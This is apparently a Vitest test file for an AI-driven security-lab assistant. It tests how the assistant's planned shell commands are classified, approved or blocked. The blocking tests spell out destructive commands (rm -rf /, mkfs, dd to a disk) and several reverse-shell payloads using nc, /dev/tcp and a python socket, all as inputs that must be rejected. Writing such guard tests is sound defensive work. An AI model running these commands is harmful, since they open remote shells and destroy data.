import { beforeEach, describe, expect, it, vi } from 'vitest';

const mocks = vi.hoisted(() => ({
  generateStructuredAi: vi.fn(),
}));

vi.mock('server-only', () => ({}));
vi.mock('@/lib/ai/providers/server', () => ({
  aiProviderConfigured: () => true,
  aiProviderModel: () => 'test-model',
  generateStructuredAi: mocks.generateStructuredAi,
}));

import {
  classifyPractitionerCommand,
  planPractitionerStep,
  practitionerRequestSchema,
  truncatePractitionerEvidence,
  validatePractitionerCommand,
} from './server';

const validPlan = {
  title: 'Inspect kernel',
  explanation: 'Read the running kernel identity.',
  objective: 'Inspect kernel information',
  command: 'uname -a',
  expected: 'Kernel and architecture information',
  risk: 'read-only' as const,
  approvalReason: 'This is a read-only inspection.',
  nextConcept: 'Compare the kernel with the OS release.',
};

const lab = {
  name: 'Ubuntu Security Lab',
  platform: 'linux' as const,
  shell: 'bash',
};

describe('AI Practitioner conversation contract', () => {
  it('accepts a normal question without a running lab', () => {
    const parsed = practitionerRequestSchema.safeParse({
      action: 'plan',
      prompt: 'What is a Linux process?',
      history: [],
    });
    expect(parsed.success).toBe(true);
  });

  it('still accepts a running lab id when execution context is available', () => {
    const parsed = practitionerRequestSchema.safeParse({
      action: 'plan',
      labInstanceId: '11111111-1111-4111-8111-111111111111',
      prompt: 'Inspect the network interfaces in my lab.',
      history: [],
    });
    expect(parsed.success).toBe(true);
  });
});

describe('AI Practitioner command policy', () => {
  it('allows read-only learning commands such as nmap against loopback', () => {
    expect(validatePractitionerCommand('nmap -sV 127.0.0.1')).toEqual({ ok: true, risk: 'read-only' });
  });

  it('marks package, service and file changes for explicit approval', () => {
    expect(classifyPractitionerCommand('sudo apt-get install -y nmap')).toBe('changes-system');
    expect(validatePractitionerCommand('sudo systemctl restart nginx')).toEqual({ ok: true, risk: 'changes-system' });
    expect(validatePractitionerCommand("echo 'hello' > /tmp/lesson.txt")).toEqual({ ok: true, risk: 'changes-system' });
    expect(validatePractitionerCommand("printf '%s\\n' hello > /tmp/lesson.txt")).toEqual({ ok: true, risk: 'changes-system' });
  });

  it('blocks destructive disk, root filesystem and lifecycle commands', () => {
    expect(validatePractitionerCommand('sudo rm -rf /').ok).toBe(false);
    expect(validatePractitionerCommand('sudo mkfs.ext4 /dev/xvda1').ok).toBe(false);
    expect(validatePractitionerCommand('sudo reboot').ok).toBe(false);
    expect(validatePractitionerCommand('dd if=/tmp/image of=/dev/xvda').ok).toBe(false);
  });

  it('blocks common remote-shell payload families while allowing ordinary netcat inspection', () => {
    expect(validatePractitionerCommand('nc -vz 127.0.0.1 22').ok).toBe(true);
    expect(validatePractitionerCommand('nc 10.0.0.2 4444 -e /bin/bash').ok).toBe(false);
    expect(validatePractitionerCommand('bash -i >& /dev/tcp/10.0.0.2/4444 0>&1').ok).toBe(false);
    expect(validatePractitionerCommand('bash -i | nc 10.0.0.2 4444').ok).toBe(false);
    expect(validatePractitionerCommand("python3 -c 'import socket,os,subprocess; s=socket.socket(); os.dup2(s.fileno(),0); subprocess.call([\"/bin/sh\",\"-i\"])'").ok).toBe(false);
  });

  it('bounds evidence retained by the practitioner', () => {
    const value = 'a'.repeat(25);
    expect(truncatePractitionerEvidence(value, 10)).toContain('output truncated by Oxsig');
    expect(truncatePractitionerEvidence('short', 10)).toBe('short');
  });
});

describe('AI Practitioner structured result boundary', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('accepts a complete validated plan', async () => {
    mocks.generateStructuredAi.mockResolvedValue(validPlan);

    await expect(planPractitionerStep({
      prompt: 'Inspect the kernel',
      history: [],
      lab,
    })).resolves.toMatchObject(validPlan);
  });

  it('rejects an incomplete structured plan even when it contains an executable command', async () => {
    mocks.generateStructuredAi.mockResolvedValue({
      title: 'Partial plan',
      explanation: 'This response was cut off.',
      command: 'uname -a',
      risk: 'read-only',
    });

    await expect(planPractitionerStep({
      prompt: 'Inspect the kernel',
      history: [],
      lab,
    })).rejects.toThrow('invalid structured plan');
  });

  it('does not turn truncated provider JSON into a partial plan', async () => {
    mocks.generateStructuredAi.mockRejectedValue(new SyntaxError('Unexpected end of JSON input'));

    await expect(planPractitionerStep({
      prompt: 'Inspect the kernel',
      history: [],
      lab,
    })).rejects.toThrow('Unexpected end of JSON input');
  });
});
